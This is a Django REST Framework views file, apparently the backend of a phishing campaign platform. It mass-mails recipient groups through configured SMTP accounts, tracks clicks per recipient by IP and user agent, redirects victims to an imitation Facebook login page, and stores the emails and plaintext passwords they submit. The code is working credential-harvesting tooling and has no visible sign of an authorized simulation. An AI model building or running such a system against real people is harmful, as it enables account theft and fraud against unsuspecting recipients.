from rest_framework import viewsets
from .models import Sender, RecipientGroup, Recipient, Message, ClickLog, CredentialLog
from .serializers import SenderSerializer, RecipientGroupSerializer, RecipientSerializer, MessageSerializer, ClickLogSerializer, CredentialLogSerializer
from rest_framework.response import Response
from rest_framework.decorators import action
from django.core.mail import get_connection, EmailMessage
import logging, json
from django.shortcuts import render, redirect
from django.http import JsonResponse
from django.utils.timezone import now
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings

logger = logging.getLogger(__name__)

def login_template_view(request, recipient_id, message_id):
    return render(request, "email_templates/Facebook.html", {"recipient_id": recipient_id, "message_id": message_id})


class ClickLogViewSet(viewsets.ReadOnlyModelViewSet):
    queryset = ClickLog.objects.select_related('recipient').order_by('-timestamp')
    serializer_class = ClickLogSerializer

class CredentialLogViewSet(viewsets.ReadOnlyModelViewSet):
    queryset = CredentialLog.objects.select_related('recipient').order_by('-timestamp')
    serializer_class = CredentialLogSerializer

class SenderViewSet(viewsets.ModelViewSet):
    queryset = Sender.objects.all()
    serializer_class = SenderSerializer

class RecipientGroupViewSet(viewsets.ModelViewSet):
    queryset = RecipientGroup.objects.all()
    serializer_class = RecipientGroupSerializer

    @action(detail=True, methods=['post'])
    def add_recipient(self, request, pk=None):
        group = self.get_object()
        recipient_id = request.data.get('recipient_id')

        try:
            recipient = Recipient.objects.get(id=recipient_id)
        except Recipient.DoesNotExist:
            logger.error(f"Recipient with ID {recipient_id} not found.")
            return Response({"detail": "Recipient not found."}, status=404)

        group.recipients.add(recipient)
        logger.info(f"Recipient {recipient.email} added to group {group.name}")
        return Response({"detail": "Recipient added to the group."}, status=200)

    @action(detail=True, methods=['put'])
    def rename_group(self, request, pk=None):
        group = self.get_object()
        new_name = request.data.get('name', '')

        if not new_name.strip():
            return Response({"detail": "Group name cannot be empty."}, status=400)

        group.name = new_name
        group.save()
        logger.info(f"Group ID {group.id} renamed to {new_name}")
        return Response({"detail": "Group renamed successfully.", "name": new_name}, status=200)

    def destroy(self, request, *args, **kwargs):
        group = self.get_object()
        logger.info(f"Deleting group: {group.name}, ID: {group.id}")
        group.recipients.clear()
        logger.info(f"Cleared all recipients from group: {group.name}")
        group.delete()
        logger.info(f"Group {group.name} deleted successfully.")
        return Response(status=204)


class RecipientViewSet(viewsets.ModelViewSet):
    queryset = Recipient.objects.all()
    serializer_class = RecipientSerializer

    @action(detail=True, methods=['put'])
    def update_recipient(self, request, pk=None):
        recipient = self.get_object()
        serializer = self.get_serializer(recipient, data=request.data, partial=True)
        if serializer.is_valid():
            serializer.save()
            logger.info(f"Recipient {recipient.email} updated successfully.")
            return Response(serializer.data)
        logger.error(f"Error updating recipient {recipient.email}: {serializer.errors}")
        return Response(serializer.errors, status=400)


    @action(detail=True, methods=['delete'])
    def delete_recipient(self, request, pk=None):
        recipient = self.get_object()
        recipient.delete()
        logger.info(f"Recipient {recipient.email} deleted successfully.")
        return Response({"message": "Recipient deleted successfully."}, status=204)


class MessageViewSet(viewsets.ModelViewSet):
    queryset = Message.objects.all()
    serializer_class = MessageSerializer

    @action(detail=False, methods=['post'])
    def send_message(self, request):
        sender_id = request.data.get("sender")
        group_id = request.data.get("recipient_group")
        campaign_name = request.data.get("campaign_name", "Unnamed Campaign")
        subject = request.data.get("subject")
        body = request.data.get("body")
        use_template = request.data.get("use_template", False)

        try:
            sender = Sender.objects.get(id=sender_id)
            group = RecipientGroup.objects.get(id=group_id)
        except Sender.DoesNotExist:
            return Response({"detail": "Sender not found."}, status=404)
        except RecipientGroup.DoesNotExist:
            return Response({"detail": "Recipient Group not found."}, status=404)

        recipients = group.recipients.all()

        if not recipients:
            return Response({"detail": "No recipients in the group."}, status=400)

        try:
            connection = get_connection(
                backend='django.core.mail.backends.smtp.EmailBackend',
                host=sender.smtp_host,
                port=sender.smtp_port,
                username=sender.smtp_username,
                password=sender.smtp_password,
                use_tls=sender.smtp_port == 587,
                use_ssl=sender.smtp_port == 465
            )

            message = Message.objects.create(
                sender=sender,
                recipient_group=group,
                campaign_name=campaign_name,
                subject=subject,
                body=body,
                link=None  # Заполним позже
            )

            message.recipients.set(recipients)

            for recipient in recipients:
                tracking_link = f"{settings.BASE_URL}/track/{recipient.id}/{message.id}/"  # <-- Передаем message_id

                email_body = f"{body}\n\n🔗 Click here: {tracking_link}" if use_template else body

                email = EmailMessage(
                    subject=subject,
                    body=email_body,
                    from_email=sender.smtp_username,
                    to=[recipient.email],
                    connection=connection
                )

                email.send()

            message.link = f"{settings.BASE_URL}/track/{recipients[0].id}/{message.id}/"
            message.save()

            return Response({"status": "Messages sent successfully"}, status=201)

        except Exception as e:
            return Response({"detail": f"Email sending failed: {str(e)}"}, status=500)



def track_click(request, recipient_id, message_id):
    ip = get_client_ip(request)
    user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')

    try:
        recipient = Recipient.objects.get(id=recipient_id)
        message = Message.objects.get(id=message_id)  # <-- Получаем кампанию
    except Recipient.DoesNotExist:
        return JsonResponse({"error": "Recipient not found"}, status=404)
    except Message.DoesNotExist:
        return JsonResponse({"error": "Message not found"}, status=404)

    # Проверяем, был ли уже зарегистрирован клик для этой кампании и пользователя
    existing_click = ClickLog.objects.filter(recipient=recipient, message=message).exists()

    if not existing_click:
        ClickLog.objects.create(
            recipient=recipient,
            message=message,  # <-- Сохраняем кампанию
            ip_address=ip,
            user_agent=user_agent,
            timestamp=now()
        )

    return redirect(f"/email-template/{recipient_id}/{message_id}/") 




def capture_credentials(request, recipient_id, message_id):
    
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")
        ip = get_client_ip(request)
        user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')

        try:
            recipient = Recipient.objects.get(id=recipient_id)
            message = Message.objects.get(id=message_id)
        except Recipient.DoesNotExist:
            recipient = None

        CredentialLog.objects.create(
            recipient=recipient,
            message=message,
            email=email,
            password=password,
            ip_address=ip,
            user_agent=user_agent,
            timestamp=now()
        )

        return JsonResponse({"status": "success"}, status=200)

    return JsonResponse({"status": "error"}, status=400)


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip



@csrf_exempt
def send_test_email(request):

    if request.method == "POST":
        try:
            data = json.loads(request.body)
            email = data.get("email")
            smtp_host = data.get("smtp_host")
            smtp_port = int(data.get("smtp_port"))
            smtp_username = data.get("smtp_username")
            smtp_password = data.get("smtp_password")

            if not (email and smtp_host and smtp_port and smtp_username and smtp_password):
                return JsonResponse({"error": "All SMTP fields and recipient email are required"}, status=400)

            logger.info(f"Sending test email to {email} using SMTP {smtp_host}:{smtp_port} as {smtp_username}")

            connection = get_connection(
                backend="django.core.mail.backends.smtp.EmailBackend",
                host=smtp_host,
                port=smtp_port,
                username=smtp_username,
                password=smtp_password,
                use_tls=smtp_port == 587,
                use_ssl=smtp_port == 465,
            )

            email_message = EmailMessage(
                subject="Test Email",
                body="This is a test email to verify SMTP settings.",
                from_email=smtp_username,
                to=[email],
                connection=connection
            )

            result = email_message.send()

            if result > 0:
                return JsonResponse({"message": "Test email sent successfully"}, status=200)
            else:
                return JsonResponse({"error": "Failed to send test email"}, status=500)

        except json.JSONDecodeError:
            return JsonResponse({"error": "Invalid JSON format"}, status=400)
        except Exception as e:
            logger.error(f"Error sending test email: {str(e)}")
            return JsonResponse({"error": str(e)}, status=500)

    return JsonResponse({"error": "Invalid request method"}, status=400)